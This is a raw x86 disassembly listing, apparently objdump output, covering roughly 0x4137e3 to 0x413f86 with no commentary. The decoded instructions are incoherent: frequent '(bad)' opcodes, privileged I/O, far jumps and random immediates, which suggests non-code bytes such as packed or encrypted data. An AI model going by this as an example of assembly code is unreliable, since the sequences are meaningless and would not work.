  4137e3:	fistp  DWORD PTR [edi-0x6b]
  4137e6:	retf   0xcd2a
  4137e9:	sbb    BYTE PTR [esi+0x63],dl
  4137ec:	cld    
  4137ed:	rol    BYTE PTR ss:[ecx-0x2ae99db8],cl
  4137f4:	ins    BYTE PTR es:[edi],dx
  4137f5:	add    DWORD PTR [ecx],ebx
  4137f7:	push   eax
  4137f8:	(bad)  
  4137f9:	mov    ebp,0x3bbd3881
  4137fe:	push   ecx
  4137ff:	mov    dl,0x2e
  413801:	daa    
  413802:	inc    edx
  413803:	shl    BYTE PTR [esi-0x1],cl
  413806:	mov    cs,ebx
  413808:	sbb    al,0xed
  41380a:	aas    
  41380b:	pop    esi
  41380c:	ins    BYTE PTR es:[edi],dx
  41380d:	mov    ebx,0xdd59a35e
  413812:	xchg   cl,cl
  413814:	scas   eax,DWORD PTR es:[edi]
  413815:	cld    
  413816:	imul   ecx,DWORD PTR [esi-0x35],0xffffffa2
  41381a:	cmp    eax,0x19f5c667
  41381f:	test   eax,0x660816dd
  413824:	cmp    al,BYTE PTR [edi]
  413826:	xchg   ecx,eax
  413827:	mov    esi,ebp
  413829:	fnstenv ds:0x500794fe
  41382f:	test   DWORD PTR [ebp+0x344b7388],eax
  413835:	pop    ebx
  413836:	pushf  
  413837:	sub    BYTE PTR [edi+0xd],cl
  41383a:	rcr    DWORD PTR [ecx-0x8],1
  41383d:	fdivr  DWORD PTR [ecx+0x2cc1f304]
  413843:	shl    BYTE PTR [esi-0x64],cl
  413846:	frstor [eax+0x40ef49e6]
  41384c:	test   al,0xc
  41384e:	lock or DWORD PTR ds:0x1902a970,0xffffffea
  413856:	inc    edx
  413857:	ss (bad) 
  413859:	repz shl DWORD PTR [edx+0x4a],0x3e
  41385e:	cmp    eax,0x8524bd35
  413864:	push   esi
  413865:	pop    esp
  413866:	mov    edx,0xf5a2e021
  41386b:	mov    ebx,0x1babfc3f
  413870:	in     eax,dx
  413871:	cld    
  413872:	cmp    eax,0xb833abfd
  413877:	xor    DWORD PTR [bp+0x1a59],eax
  41387c:	or     ch,bh
  41387e:	dec    edi
  41387f:	into   
  413880:	cwde   
  413881:	inc    ebp
  413882:	test   al,0x65
  413884:	xor    ch,BYTE PTR [edx+ebx*2-0x3f538638]
  41388b:	pop    edi
  41388c:	pop    ebp
  41388d:	lds    ebp,FWORD PTR [ecx]
  41388f:	in     eax,0x83
  413891:	cld    
  413892:	cmp    bh,ch
  413894:	leave  
  413895:	push   0x15ed4849
  41389a:	test   DWORD PTR [edx+0x32],ebp
  41389d:	and    BYTE PTR [edx+0x24],ah
  4138a0:	(bad)  
  4138a1:	ins    DWORD PTR es:[edi],dx
  4138a2:	cdq    
  4138a3:	pushf  
  4138a4:	call   0x51d2:0x3e3ff6ab
  4138ab:	jno    0x41391a
  4138ad:	jp     0x41390c
  4138af:	jbe    0x413929
  4138b1:	out    dx,al
  4138b2:	int    0x9e
  4138b4:	mov    esp,0x8be10aa0
  4138b9:	gs test dh,0x75
  4138bd:	and    al,0x74
  4138bf:	hlt    
  4138c0:	aaa    
  4138c1:	push   esp
  4138c2:	lds    edi,FWORD PTR [ebx-0x3]
  4138c5:	inc    ebx
  4138c6:	xor    bl,cl
  4138c8:	jmp    0x9e60:0x1ecb797d
  4138cf:	add    ebx,DWORD PTR [esi-0x16]
  4138d2:	rol    BYTE PTR [ebx+eiz*8-0x2d42786],cl
  4138d9:	mov    esp,0x660e2e48
  4138de:	retf   0x8fbd
  4138e1:	xchg   esp,eax
  4138e2:	inc    ebx
  4138e3:	(bad)  
  4138e4:	je     0x4138ed
  4138e6:	pop    ecx
  4138e7:	enter  0x6879,0x4d
  4138eb:	or     al,0x59
  4138ed:	dec    esp
  4138ee:	mov    esi,0xb58d6bfe
  4138f3:	lock fimul DWORD PTR [ebp+eax*2+0x15]
  4138f8:	push   ecx
  4138f9:	and    edi,DWORD PTR [ecx]
  4138fb:	retf   0xd052
  4138fe:	push   cs
  4138ff:	out    dx,al
  413900:	stos   DWORD PTR es:[edi],eax
  413901:	sbb    al,0xc
  413903:	or     al,dh
  413905:	aad    0xb9
  413907:	xchg   edi,eax
  413908:	push   es
  413909:	bound  ecx,QWORD PTR [ebp+0x7e]
  41390c:	(bad)  
  41390d:	pop    ecx
  41390e:	sbb    eax,0xcb8587c3
  413913:	add    BYTE PTR [eax-0x1593b1d3],al
  413919:	cmp    eax,0x82289678
  41391e:	mov    ebp,0x42d09429
  413923:	pop    esi
  413924:	sub    bh,BYTE PTR [eax+edi*2-0x1f4ad976]
  41392b:	popa   
  41392c:	mov    ebp,0x9b1040bf
  413931:	das    
  413932:	sbb    esp,ecx
  413934:	repnz stc 
  413936:	or     esi,DWORD PTR [esi-0x3003a5c5]
  41393c:	lods   eax,DWORD PTR ds:[esi]
  41393d:	shr    DWORD PTR [ebp+0x6a],0xf3
  413941:	addr16 retf 
  413943:	mov    edx,ecx
  413945:	push   esi
  413946:	and    ecx,ebx
  413948:	xchg   esp,eax
  413949:	sub    edi,edx
  41394b:	in     al,0x43
  41394d:	xor    al,0x36
  41394f:	jmp    0x41392f
  413951:	out    0xa7,al
  413953:	cs inc esi
  413955:	jo     0x41394d
  413957:	cmp    edx,DWORD PTR [edi]
  413959:	lods   eax,DWORD PTR ds:[esi]
  41395a:	jb     0x4139aa
  41395c:	cld    
  41395d:	aaa    
  41395e:	push   eax
  41395f:	pusha  
  413960:	add    al,0xce
  413962:	adc    BYTE PTR [esp+edx*4],dl
  413965:	pop    es
  413966:	push   esp
  413967:	cmp    cl,BYTE PTR ds:0xa36e2e17
  41396d:	push   0xe8ba6054
  413972:	(bad)  
  413973:	int3   
  413974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413975:	nop
  413976:	jno    0x413910
  413978:	xchg   esi,eax
  413979:	or     al,BYTE PTR [edx-0x7ae636f8]
  41397f:	ret    0x1215
  413982:	mov    bl,0xd9
  413984:	or     DWORD PTR [edx-0x3abda6b4],ecx
  41398a:	xchg   esp,eax
  41398b:	out    0x44,al
  41398d:	les    esp,FWORD PTR [ecx+ebp*8+0xb]
  413991:	mov    eax,ds:0xf2ef1636
  413996:	xor    al,0xc
  413998:	cmp    al,BYTE PTR fs:[eax-0x76]
  41399c:	test   eax,0x3efd5838
  4139a1:	retf   
  4139a2:	ins    BYTE PTR es:[edi],dx
  4139a3:	pop    ss
  4139a4:	xor    al,0xfc
  4139a6:	int    0x5c
  4139a8:	out    0x7f,eax
  4139aa:	ss shr BYTE PTR ds:[eax-0x4e7e03b2],1
  4139b2:	ins    DWORD PTR es:[edi],dx
  4139b3:	(bad)  
  4139b4:	(bad)  [eiz*4-0x18b0119f]
  4139bb:	arpl   WORD PTR [edx],dx
  4139bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139be:	(bad)  
  4139bf:	xchg   esp,eax
  4139c0:	jmp    0xe5ccd027
  4139c5:	loop   0x4139f6
  4139c7:	jmp    0x413a35
  4139c9:	or     BYTE PTR [edi],dl
  4139cb:	cmp    al,0x22
  4139cd:	push   cs
  4139ce:	lahf   
  4139cf:	jmp    0x413983
  4139d1:	xor    DWORD PTR ds:0xb4822c64,ecx
  4139d7:	loopne 0x413a17
  4139d9:	mov    bh,0xc9
  4139db:	call   0xe8fe611f
  4139e0:	pop    ebx
  4139e1:	(bad)  
  4139e2:	loope  0x413a36
  4139e4:	adc    al,0x24
  4139e6:	sbb    DWORD PTR [edi],ebp
  4139e8:	iret   
  4139e9:	lea    edi,[esi+ebx*8+0x7dc7a5ef]
  4139f0:	ficom  WORD PTR [esi+0x66cc06d4]
  4139f6:	mov    edx,0x7dbe9851
  4139fb:	out    0xad,eax
  4139fd:	jg     0x413a47
  4139ff:	dec    ebx
  413a00:	xchg   esi,eax
  413a01:	std    
  413a02:	pcmpeqw mm6,mm3
  413a05:	or     ecx,edx
  413a07:	repnz shr BYTE PTR [ecx],cl
  413a0a:	es push esi
  413a0c:	pop    ecx
  413a0d:	(bad)  
  413a0e:	leave  
  413a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a10:	adc    edi,DWORD PTR [esi-0x7109acd4]
  413a16:	xchg   bl,bl
  413a18:	fdiv   QWORD PTR [eax+eax*2]
  413a1b:	pusha  
  413a1c:	loop   0x413a54
  413a1e:	mov    ebx,0xdad4bc64
  413a23:	push   ds
  413a24:	(bad)  
  413a26:	jno    0x4139f8
  413a28:	mov    ch,0x81
  413a2a:	push   es
  413a2b:	fadd   QWORD PTR [esi+eax*2+0x48]
  413a2f:	jl     0x413a0b
  413a31:	jb     0x413aaf
  413a33:	push   eax
  413a34:	pop    ebp
  413a35:	mov    eax,0xcdbc603e
  413a3a:	(bad)  
  413a3b:	cmc    
  413a3c:	add    eax,0x31e28edd
  413a41:	fisub  DWORD PTR [edx-0x33337625]
  413a47:	(bad)  
  413a48:	cli    
  413a49:	imul   ecx,DWORD PTR [esi],0xa18d8271
  413a4f:	loope  0x413a4b
  413a51:	sub    al,0xa5
  413a53:	retf   0x358
  413a56:	push   0x2901e6d3
  413a5b:	ds retf 0x89c1
  413a5f:	ins    DWORD PTR es:[edi],dx
  413a60:	push   DWORD PTR [edx]
  413a62:	repz adc BYTE PTR [edx],cl
  413a65:	and    ebx,DWORD PTR [ecx-0x7c468d88]
  413a6b:	add    BYTE PTR [ebp+0x53fd1d88],dh
  413a71:	sbb    ebp,DWORD PTR [esi-0x76]
  413a74:	push   ebp
  413a75:	repnz (bad) 
  413a77:	mov    ds:0x7643d9b2,eax
  413a7c:	ss fcomip st,st(6)
  413a7f:	popf   
  413a80:	cdq    
  413a81:	inc    ebx
  413a82:	cmp    dh,BYTE PTR [edx]
  413a84:	mov    cl,0x24
  413a86:	xchg   edi,eax
  413a87:	(bad)  
  413a88:	cmc    
  413a89:	iret   
  413a8a:	ja     0x413a78
  413a8c:	scas   al,BYTE PTR es:[edi]
  413a8d:	enter  0x9af1,0x32
  413a91:	ins    BYTE PTR es:[edi],dx
  413a92:	lds    esi,FWORD PTR [edx-0x1a8d9e5e]
  413a98:	cmp    edi,DWORD PTR [eax]
  413a9a:	jno    0x413ab1
  413a9c:	fs popa 
  413a9e:	inc    edx
  413a9f:	out    0x28,eax
  413aa1:	packssdw mm0,QWORD PTR [edi-0x164e3187]
  413aa8:	push   esp
  413aa9:	cmp    esp,DWORD PTR [ecx-0x41]
  413aac:	pop    edx
  413aad:	in     al,dx
  413aae:	xchg   edi,eax
  413aaf:	xchg   esi,eax
  413ab0:	ror    DWORD PTR [ebp+0x5f502ab1],cl
  413ab6:	jne    0x413b2c
  413ab8:	les    edi,FWORD PTR [eax+0x612db056]
  413abe:	pop    ebp
  413abf:	pop    ebp
  413ac0:	jae    0x413b32
  413ac2:	xor    dl,dh
  413ac4:	pop    ds
  413ac5:	cmp    edx,edi
  413ac7:	mov    DWORD PTR [di],edx
  413aca:	(bad)  
  413acb:	lea    esp,[ecx]
  413acd:	out    dx,al
  413ace:	pop    ecx
  413acf:	sbb    cl,BYTE PTR [edi]
  413ad1:	es jbe 0x413b45
  413ad4:	jae    0x413b1f
  413ad6:	std    
  413ad7:	and    edi,edx
  413ad9:	fisttp WORD PTR [edx+0x58c8513f]
  413adf:	jbe    0x413a9f
  413ae1:	(bad)  
  413ae3:	xchg   edx,eax
  413ae4:	xchg   dh,ah
  413ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae7:	out    dx,eax
  413ae8:	adc    DWORD PTR [ecx],ebp
  413aea:	pop    eax
  413aeb:	out    0x49,al
  413aed:	or     eax,0x787b8287
  413af2:	leave  
  413af3:	add    BYTE PTR [ecx+0x31a4b149],bh
  413af9:	cmp    al,0x44
  413afb:	cmp    dl,BYTE PTR ds:0xaac57e09
  413b01:	in     eax,dx
  413b02:	in     al,0xc0
  413b04:	push   esp
  413b05:	dec    ebp
  413b06:	adc    ebp,edx
  413b08:	scas   eax,DWORD PTR es:[edi]
  413b09:	jo     0x413b09
  413b0b:	xchg   ebp,eax
  413b0c:	jecxz  0x413b45
  413b0e:	je     0x413ae1
  413b10:	dec    ebp
  413b11:	lock test al,0xbb
  413b14:	enter  0x55fc,0xe6
  413b18:	in     al,dx
  413b19:	nop
  413b1a:	cli    
  413b1b:	mov    bh,0x5
  413b1d:	in     al,dx
  413b1e:	ror    dl,0x26
  413b21:	fldcw  WORD PTR [edi+0x7e]
  413b24:	mul    BYTE PTR [edi+ebp*1-0x7b4fe90]
  413b2b:	cmp    BYTE PTR [ebx],dl
  413b2d:	imul   ebx,DWORD PTR [ecx+ebx*4-0x62],0x42
  413b32:	inc    edi
  413b33:	rcl    BYTE PTR [esi],1
  413b35:	and    eax,0x1dd4f2b2
  413b3a:	mov    BYTE PTR [edx+0x2327b7b3],0xe
  413b41:	pushf  
  413b42:	sbb    DWORD PTR [ebp+0x6a],edi
  413b45:	cld    
  413b46:	call   0xc15b58ea
  413b4b:	je     0x413b69
  413b4d:	add    al,dh
  413b4f:	frstor [ebx]
  413b51:	xchg   BYTE PTR [eax-0x6],ah
  413b54:	pop    es
  413b55:	mov    esi,0x27193c5e
  413b5a:	nop
  413b5b:	out    0x23,eax
  413b5d:	cdq    
  413b5e:	scas   eax,DWORD PTR es:[edi]
  413b5f:	pop    esi
  413b60:	mov    edx,0x74a31687
  413b65:	pushf  
  413b66:	jmp    0xcdca27e2
  413b6b:	lods   eax,DWORD PTR ds:[esi]
  413b6c:	bound  ecx,QWORD PTR [edx-0x5fbe2aa8]
  413b72:	lea    ecx,[eax]
  413b74:	pop    fs
  413b76:	js     0x413b66
  413b78:	mov    ah,cl
  413b7a:	iret   
  413b7b:	out    0xdf,eax
  413b7d:	repz fimul WORD PTR [eax-0xdc14bff]
  413b84:	scas   eax,DWORD PTR es:[edi]
  413b85:	xor    dl,dh
  413b87:	test   DWORD PTR ds:[edx],ecx
  413b8a:	sbb    al,0xe
  413b8c:	push   eax
  413b8d:	rol    DWORD PTR [esi+0x2705b42e],cl
  413b93:	push   0xffffffe9
  413b95:	ja     0x413bb7
  413b97:	sbb    ebx,DWORD PTR [edx]
  413b99:	inc    edi
  413b9a:	imul   BYTE PTR [edx-0x49415c32]
  413ba0:	stos   DWORD PTR es:[edi],eax
  413ba1:	retf   
  413ba2:	retf   
  413ba3:	cdq    
  413ba4:	stos   DWORD PTR es:[edi],eax
  413ba5:	xor    edx,DWORD PTR [ecx+eiz*4+0x7b]
  413ba9:	and    eax,DWORD PTR [ebp-0x6a3fcb6a]
  413baf:	dec    ecx
  413bb0:	pop    eax
  413bb1:	cli    
  413bb2:	fisubr WORD PTR [ecx]
  413bb4:	cli    
  413bb5:	jne    0x413c27
  413bb7:	adc    al,0x68
  413bb9:	icebp  
  413bba:	(bad)  
  413bbb:	cmc    
  413bbc:	push   edi
  413bbd:	pushf  
  413bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bbf:	xor    ebx,esi
  413bc1:	je     0x413c3b
  413bc3:	or     edi,DWORD PTR [edi-0x6d327cc8]
  413bc9:	retf   
  413bca:	push   0xffffffaf
  413bcc:	(bad)  
  413bcd:	pcmpgtb mm5,QWORD PTR [edi]
  413bd0:	inc    esp
  413bd1:	out    0x54,al
  413bd3:	imul   edi,edx,0xffffffda
  413bd6:	xchg   ecx,eax
  413bd7:	pop    ss
  413bd8:	int    0xbf
  413bda:	mov    edx,0xea030ca2
  413bdf:	push   es
  413be0:	out    dx,al
  413be1:	dec    ebx
  413be2:	sbb    DWORD PTR [edx],edx
  413be4:	(bad)  
  413be5:	fistp  DWORD PTR [ecx]
  413be7:	mov    ah,BYTE PTR [edi]
  413be9:	jp     0x413b96
  413beb:	pop    ebx
  413bec:	jle    0x413bc8
  413bee:	in     eax,dx
  413bef:	retf   0x847e
  413bf2:	cmp    bh,ah
  413bf4:	pop    ebp
  413bf5:	and    edx,0x6fe759fd
  413bfb:	repz pushf 
  413bfd:	stos   BYTE PTR es:[edi],al
  413bfe:	inc    esp
  413bff:	add    sp,ax
  413c02:	xor    eax,0x1d8c6afa
  413c07:	test   BYTE PTR [esi],0xf
  413c0a:	xor    BYTE PTR [eax],0x9b
  413c0d:	fs mov edi,0x9871a219
  413c13:	jae    0x413bae
  413c15:	xor    BYTE PTR [esp+edi*1],al
  413c18:	fmul   DWORD PTR [edi-0x62]
  413c1b:	loopne 0x413c63
  413c1d:	xchg   DWORD PTR [edi+0xf],esp
  413c20:	add    eax,0x9734efe2
  413c25:	in     eax,0xfe
  413c27:	fidiv  WORD PTR [edx+0x75285404]
  413c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2e:	xchg   esp,eax
  413c2f:	in     al,0x17
  413c31:	mov    ds:0x1d76f323,al
  413c36:	lahf   
  413c37:	add    ebx,ebx
  413c39:	xor    DWORD PTR ds:0x58c8e4ea,edx
  413c3f:	rol    BYTE PTR [esi-0x27afa800],1
  413c45:	xor    edi,edx
  413c47:	push   esi
  413c48:	je     0x413c83
  413c4a:	xchg   edx,eax
  413c4b:	dec    edi
  413c4c:	dec    ecx
  413c4d:	and    DWORD PTR [edi+0x54],esi
  413c50:	xchg   esi,eax
  413c51:	std    
  413c52:	sub    BYTE PTR [ebp+0x73dbf9fb],dh
  413c58:	mov    eax,ds:0x2225d9ee
  413c5d:	sub    al,bh
  413c5f:	cwde   
  413c60:	and    BYTE PTR [edx+0x7da7fb52],ah
  413c66:	not    BYTE PTR [ebx]
  413c68:	push   esi
  413c69:	lea    ecx,[esi+0x42847bcb]
  413c6f:	sub    eax,0xdd77a60
  413c74:	es mov ebp,0x28cddf9d
  413c7a:	pop    edi
  413c7b:	xor    BYTE PTR [edx],ah
  413c7d:	fidiv  WORD PTR [ebp-0x1f]
  413c80:	add    DWORD PTR [esi],esp
  413c82:	dec    edx
  413c83:	fnstsw WORD PTR [edi]
  413c85:	in     eax,0xe2
  413c87:	daa    
  413c88:	or     eax,0x211c0e06
  413c8d:	xchg   esi,eax
  413c8e:	mov    eax,0xf6931d47
  413c93:	cmp    BYTE PTR [esi+0x72],bl
  413c96:	dec    ebx
  413c97:	mov    ah,0xe
  413c99:	lds    ebx,FWORD PTR [ecx+0x77a83f3]
  413c9f:	cdq    
  413ca0:	mov    ah,0x1
  413ca2:	in     al,dx
  413ca3:	loope  0x413cf9
  413ca5:	je     0x413c77
  413ca7:	ins    BYTE PTR es:[edi],dx
  413ca8:	xchg   DWORD PTR [ebx],esp
  413caa:	xor    eax,0x22d1f7bc
  413caf:	out    dx,al
  413cb0:	dec    ebx
  413cb1:	mov    ecx,0x64de2b6e
  413cb6:	aas    
  413cb7:	pusha  
  413cb8:	rol    DWORD PTR [eax+esi*8],0xd8
  413cbc:	loopne 0x413c6c
  413cbe:	push   0xffffffc1
  413cc0:	fimul  DWORD PTR [ecx-0x4ec31f10]
  413cc6:	call   0x9654:0xf1e1835
  413ccd:	sub    eax,0x883dab36
  413cd2:	(bad)  
  413cd3:	cdq    
  413cd4:	fiadd  DWORD PTR [eax+0x54]
  413cd7:	pop    ds
  413cd8:	sbb    eax,0x8f4e26a4
  413cdd:	iret   
  413cde:	dec    eax
  413ce0:	or     eax,0xbc7a1a7b
  413ce5:	ret    0xbc66
  413ce8:	jmp    0x68d11771
  413ced:	jns    0x413cce
  413cef:	add    DWORD PTR [ebp+0x31],esp
  413cf2:	leave  
  413cf3:	and    esp,DWORD PTR [ecx+0x6]
  413cf6:	mov    ecx,0x2501f977
  413cfb:	addr16 retf 0xf052
  413cff:	sub    DWORD PTR [ecx],0xa22ba3a9
  413d05:	scas   al,BYTE PTR es:[edi]
  413d06:	mov    esi,0x1a93c353
  413d0b:	dec    ecx
  413d0c:	stc    
  413d0d:	jo     0x413d23
  413d0f:	loopne 0x413cae
  413d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d12:	cli    
  413d13:	push   ecx
  413d14:	mov    gs,WORD PTR [esi+edi*2-0x623985cf]
  413d1b:	jecxz  0x413d4c
  413d1d:	js     0x413d4b
  413d1f:	shl    BYTE PTR [eax+0x716fbb4d],cl
  413d25:	jb     0x413cb9
  413d27:	adc    DWORD PTR [esp+eax*2-0x32],ebp
  413d2b:	neg    DWORD PTR [ebx-0x12]
  413d2e:	sub    al,BYTE PTR [eax+eiz*2-0x6d]
  413d32:	dec    esp
  413d33:	jmp    0xb035:0x714946c7
  413d3a:	popf   
  413d3b:	mov    gs,WORD PTR [esi-0x49]
  413d3e:	or     BYTE PTR ds:0xc058463a,0xbd
  413d45:	xchg   esi,eax
  413d46:	mov    ds:0x8db0ef85,al
  413d4b:	test   BYTE PTR [edi+0x7d],bl
  413d4e:	push   ss
  413d4f:	adc    DWORD PTR [ebp-0x20],ebx
  413d52:	jle    0x413d99
  413d54:	addr16 xor al,0xd5
  413d57:	loope  0x413d4e
  413d59:	in     eax,dx
  413d5a:	fwait
  413d5b:	mov    esp,0xc730635b
  413d60:	out    0x5e,al
  413d62:	ret    
  413d63:	lock push 0xa846b3f5
  413d69:	xlat   BYTE PTR ds:[ebx]
  413d6a:	dec    eax
  413d6b:	sbb    ch,BYTE PTR [ebx+esi*2]
  413d6e:	lahf   
  413d6f:	aam    0x4b
  413d71:	cld    
  413d72:	js     0x413d7e
  413d74:	out    dx,al
  413d75:	mov    ds:0xf72773d0,eax
  413d7a:	mov    eax,ds:0x348343d2
  413d7f:	mov    dl,0x97
  413d81:	popf   
  413d82:	mov    ?,WORD PTR [edi+0x3a665d4b]
  413d88:	das    
  413d89:	push   ecx
  413d8a:	lods   eax,DWORD PTR ds:[esi]
  413d8b:	mov    eax,0x8fbb2060
  413d90:	xchg   edx,eax
  413d91:	loope  0x413d69
  413d93:	jb     0x413d31
  413d95:	gs in  eax,0x9f
  413d98:	inc    ebx
  413d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d9a:	int3   
  413d9b:	jns    0x413e19
  413d9d:	icebp  
  413d9e:	lods   al,BYTE PTR ds:[esi]
  413d9f:	mov    edx,0x1f3c0a26
  413da4:	repz jno 0x413e00
  413da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da8:	fcmovnb st,st(5)
  413daa:	push   ss
  413dab:	int    0xde
  413dad:	sub    edi,0xffffffc6
  413db0:	fwait
  413db1:	sahf   
  413db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db3:	push   0xd6243afc
  413db8:	mov    bl,0x8b
  413dba:	mov    ds,WORD PTR [eax-0x78]
  413dbd:	dec    eax
  413dbe:	sbb    DWORD PTR [ebp-0x42849198],ebp
  413dc4:	or     edi,DWORD PTR [edx-0x6cd5dd11]
  413dca:	stc    
  413dcb:	pop    edi
  413dcc:	pusha  
  413dcd:	addr16 in eax,dx
  413dcf:	add    BYTE PTR [edi+edi*2+0x24],0x80
  413dd4:	mov    BYTE PTR [edi-0x80],cl
  413dd7:	out    dx,al
  413dd8:	push   ecx
  413dd9:	mov    WORD PTR [ecx+0x45],gs
  413ddc:	pop    edx
  413ddd:	xchg   edi,eax
  413dde:	iret   
  413ddf:	pop    ebp
  413de0:	sbb    edi,esi
  413de2:	jnp    0x413de7
  413de4:	pushf  
  413de5:	sub    ch,dh
  413de7:	dec    esp
  413de8:	mov    dl,0x41
  413dea:	aam    0x78
  413dec:	inc    DWORD PTR [ecx+0x44]
  413def:	sbb    eax,DWORD PTR [ecx+0x55]
  413df2:	pop    ss
  413df3:	fldcw  WORD PTR [ebx+eax*1]
  413df6:	inc    ebx
  413df7:	add    BYTE PTR [edx+0x4769aa97],ah
  413dfd:	inc    ecx
  413dfe:	mov    esi,0xb09cf06c
  413e03:	ror    dh,0x8
  413e06:	push   esi
  413e07:	pop    esp
  413e08:	inc    ebx
  413e09:	dec    eax
  413e0a:	fs in  al,0xae
  413e0d:	mov    dl,BYTE PTR [ebx-0x5ce9af26]
  413e13:	jg     0x413e1e
  413e15:	ja     0x413db4
  413e17:	lahf   
  413e18:	rol    BYTE PTR [esp+edx*2+0x7e],0x86
  413e1d:	push   es
  413e1e:	cmp    al,0xdf
  413e20:	shl    DWORD PTR [edx],cl
  413e22:	cmp    eax,0xc085257c
  413e27:	pushf  
  413e28:	ja     0x413e8a
  413e2a:	ja     0x413e26
  413e2c:	arpl   WORD PTR [eax-0x71a1b85f],dx
  413e32:	mov    cl,0x6e
  413e34:	sub    edi,esi
  413e36:	xor    ch,bh
  413e38:	rcl    BYTE PTR [eax+0x79bfdb20],0x54
  413e3f:	xchg   edx,eax
  413e40:	arpl   ax,bp
  413e42:	xchg   ecx,eax
  413e43:	jns    0x413dfb
  413e45:	(bad)  [ecx-0x70]
  413e48:	fidivr WORD PTR [esi]
  413e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e4b:	outs   dx,DWORD PTR ds:[esi]
  413e4c:	ret    
  413e4d:	(bad)  
  413e4f:	jp     0x413e1f
  413e51:	inc    eax
  413e52:	push   esp
  413e53:	rcr    esi,1
  413e55:	bsr    esi,DWORD PTR [ebx-0x5f]
  413e59:	jmp    0x9a193ee
  413e5e:	xlat   BYTE PTR ds:[ebx]
  413e5f:	retf   
  413e60:	jbe    0x413e87
  413e62:	cmp    bl,bl
  413e64:	les    esp,FWORD PTR [esi+ebp*1+0x397687f9]
  413e6b:	adc    bl,BYTE PTR [edi-0x35677533]
  413e71:	lahf   
  413e72:	dec    ebx
  413e73:	lahf   
  413e74:	fcomp  DWORD PTR [edi]
  413e76:	push   es
  413e77:	rcl    ah,1
  413e79:	daa    
  413e7a:	pop    ebp
  413e7b:	call   0x7c8c39bc
  413e80:	lds    ebx,FWORD PTR [ecx-0x405a79]
  413e86:	xchg   ecx,eax
  413e87:	or     eax,0x42567de7
  413e8c:	dec    esi
  413e8d:	dec    edx
  413e8e:	lea    esp,[esi]
  413e90:	sub    DWORD PTR [edx+0x2b8372fc],edi
  413e96:	lahf   
  413e97:	sbb    edi,DWORD PTR [ebx+0x1016dad2]
  413e9d:	add    al,0xed
  413e9f:	arpl   WORD PTR [edi],si
  413ea1:	pop    ss
  413ea2:	scas   al,BYTE PTR es:[edi]
  413ea3:	dec    ebx
  413ea4:	xchg   dh,ah
  413ea6:	mov    eax,ds:0x3d5521ef
  413eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eac:	retf   
  413ead:	stc    
  413eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eaf:	mov    eax,ds:0xc2ccc6eb
  413eb4:	mov    ds:0xce3d9215,eax
  413eb9:	mov    esp,0xa407fd15
  413ebe:	push   ecx
  413ebf:	mov    al,BYTE PTR [ebx-0x49]
  413ec2:	or     al,0xfd
  413ec4:	out    0x6b,eax
  413ec6:	inc    edx
  413ec7:	xchg   edi,eax
  413ec8:	sub    al,0xf4
  413eca:	add    ah,al
  413ecc:	sbb    al,cl
  413ece:	push   ss
  413ecf:	loope  0x413f06
  413ed1:	sbb    esi,DWORD PTR ds:0x4e266e39
  413ed7:	pop    esp
  413ed8:	popf   
  413ed9:	push   esp
  413eda:	cmp    ebx,DWORD PTR [eax-0x4c]
  413edd:	pop    es
  413ede:	clc    
  413edf:	test   ebx,esp
  413ee1:	popf   
  413ee2:	lods   eax,DWORD PTR ds:[esi]
  413ee3:	dec    ecx
  413ee4:	mov    DWORD PTR [edi],ebp
  413ee6:	xchg   esp,eax
  413ee7:	jl     0x413ef5
  413ee9:	mov    ch,0xd5
  413eeb:	ffree  st(0)
  413eed:	dec    eax
  413eee:	xchg   al,bl
  413ef0:	mov    eax,0x58da6c39
  413ef5:	push   es
  413ef6:	mov    edx,0xbd50b739
  413efb:	rcr    DWORD PTR [ebx],0x7
  413efe:	fld    st(2)
  413f00:	daa    
  413f01:	out    0xf9,eax
  413f03:	iret   
  413f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f05:	mov    ds:0xc5b7d4ec,al
  413f0a:	aaa    
  413f0b:	or     al,0x22
  413f0d:	loop   0x413ec8
  413f0f:	scas   al,BYTE PTR es:[edi]
  413f10:	les    ebx,FWORD PTR [edi+0x2523e2ab]
  413f16:	adc    al,0x9f
  413f18:	psubusb mm5,QWORD PTR [ecx+0x311a37d9]
  413f1f:	pop    edx
  413f20:	cmp    al,0x1e
  413f22:	enter  0x934,0xe1
  413f26:	xchg   edi,edx
  413f28:	xlat   BYTE PTR ds:[ebx]
  413f29:	mov    eax,ds:0xd31c5280
  413f2e:	push   esi
  413f2f:	clc    
  413f30:	cmp    BYTE PTR [edi-0x48a109e5],dl
  413f36:	mov    esp,cs
  413f38:	mov    DWORD PTR [ebx+0x2],edx
  413f3b:	into   
  413f3c:	repz call 0x55fb5807
  413f42:	mov    bh,BYTE PTR [eax+0x79]
  413f45:	psrad  mm5,mm0
  413f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f49:	jge    0x413ecb
  413f4b:	stc    
  413f4c:	fild   QWORD PTR [ecx+0x3f]
  413f4f:	jg     0x413f32
  413f51:	and    eax,0x72d7c292
  413f56:	ss xchg esi,esp
  413f59:	mov    ebp,0x8f04ba48
  413f5e:	pop    edx
  413f5f:	nop
  413f60:	xchg   esp,eax
  413f61:	out    dx,eax
  413f62:	in     al,dx
  413f63:	push   ebx
  413f64:	loope  0x413f0b
  413f66:	jmp    0x16c4:0xc2b0c49d
  413f6d:	adc    eax,0x3b6aef55
  413f72:	popa   
  413f73:	lods   eax,DWORD PTR ds:[esi]
  413f74:	sbb    edx,DWORD PTR [ebx-0x4b4e15e9]
  413f7a:	loope  0x413f83
  413f7c:	xor    ebp,DWORD PTR [ebp+0x2b4fcef4]
  413f82:	jne    0x413f39
  413f84:	mov    al,0xc2
  413f86:	leave  
